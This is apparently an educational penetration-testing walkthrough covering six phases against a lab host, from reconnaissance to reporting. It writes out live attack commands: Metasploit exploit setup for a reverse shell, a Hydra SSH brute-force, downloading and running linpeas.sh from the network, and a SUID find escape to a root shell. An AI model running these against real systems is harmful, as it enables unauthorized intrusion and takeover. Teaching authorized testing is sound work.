STEP 01
Reconnaissance
Passive & active information gathering
▾

Objective

The goal of reconnaissance is to gather as much information as possible about the target without triggering any alarms. We used both passive (no direct interaction) and active (direct interaction with target) techniques.

Tools Used

  • whois — domain registration information
  • nslookup / dig — DNS record enumeration
  • theHarvester — email, subdomain, and host discovery
  • OSINT Framework — open-source intelligence gathering

Commands Run

# Passive recon — WHOIS lookup
whois target.lab.local

# DNS enumeration
dig ANY target.lab.local
nslookup -type=MX target.lab.local

# Subdomain discovery
theHarvester -d target.lab.local -b all

Findings

// RESULT

Discovered 3 subdomains, mail server configuration, and administrator email format. No active interaction with target services at this stage.

STEP 02
Scanning & Enumeration
Port scanning, service detection, OS fingerprinting
▾

Objective

Identify open ports, running services, and OS versions on the target system. This maps the attack surface.

Tools Used

  • nmap — port & service scanning
  • Netcat — banner grabbing
  • enum4linux — SMB/Samba enumeration

Commands Run

# Full port scan with service/OS detection
nmap -sV -sC -O -p- 192.168.1.100

# Aggressive scan (use carefully)
nmap -A -T4 192.168.1.100

# SMB enumeration
enum4linux -a 192.168.1.100

# Banner grabbing
nc -v 192.168.1.100 22

Findings

// RESULT

Open ports: 22 (SSH), 80 (HTTP), 445 (SMB). OS: Ubuntu 20.04. Apache 2.4.41 running on port 80. SMB revealed shared folders and a guest account.

STEP 03
Vulnerability Analysis
Identifying exploitable weaknesses
▾

Objective

Cross-reference discovered services with known CVEs and misconfigurations. Prioritize vulnerabilities by severity.

Tools Used

  • Nessus / OpenVAS — automated vulnerability scanner
  • searchsploit — search local Exploit-DB
  • Nikto — web server vulnerability scanner

Commands Run

# Web vulnerability scan
nikto -h http://192.168.1.100

# Search for Apache exploits
searchsploit apache 2.4.41

# Nmap vuln scripts
nmap --script vuln 192.168.1.100

Findings

// RESULT

Identified CVE-XXXX-XXXX on the Apache version. Directory listing enabled at /uploads/. Default credentials still set on admin panel. SMB null session allowed.

STEP 04
Exploitation
Gaining initial access to the target
▾

Objective

Leverage identified vulnerabilities to gain unauthorized access — within the scope of the lab environment and with explicit permission.

Tools Used

  • Metasploit Framework — exploit delivery
  • Burp Suite — web application attacks
  • Hydra — credential brute-forcing

Commands Run

# Launch Metasploit
msfconsole

# Select and configure exploit
msf6 > use exploit/linux/http/example_exploit
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > run

# Brute-force SSH login
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

Findings

// RESULT

Successfully obtained a reverse shell as www-data via the Apache vulnerability. SSH login also succeeded using password "password123" for user admin.

Only run exploitation in authorized, isolated lab environments. Never attempt on systems you don't own or have written permission to test.

STEP 05
Post-Exploitation
Privilege escalation & persistence
▾

Objective

After gaining initial access, escalate privileges to root and demonstrate what an attacker could do from this position.

Tools Used

  • LinPEAS — Linux privilege escalation scanner
  • sudo -l — check sudo permissions
  • GTFOBins — exploiting misconfigured binaries

Commands Run

# Check current user & sudo perms
id
sudo -l

# Run LinPEAS for auto-escalation hints
wget https://linpeas.sh -O linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Example: SUID binary exploit
find / -perm -4000 2>/dev/null
/usr/bin/find -exec /bin/sh -p \; -quit

Findings

// RESULT

Escalated to root via misconfigured SUID binary. Demonstrated ability to read /etc/shadow, create backdoor accounts, and access all files on the system.

LinPEAS privesc SUID root
STEP 06
Reporting
Findings, impact, and remediation
▾

Objective

Compile all findings into a professional report. A good pentest report communicates what was found, how severe it is, and how to fix it.

Report Structure

  • Executive Summary — high-level overview for non-technical audience
  • Scope & Methodology — what was tested and how
  • Findings — each vulnerability with severity rating (CVSS)
  • Evidence — screenshots, command output, proof-of-concept
  • Remediation — specific, actionable fix for each finding
  • Conclusion — overall security posture assessment

Key Findings Summary

// CRITICAL

Unauthenticated RCE via Apache 2.4.41 — Patch to latest version immediately.

// HIGH

Weak/default SSH credentials — Enforce strong password policy, disable password auth, use SSH keys.

// MEDIUM

SMB null sessions allowed — Require authentication for all SMB connections.
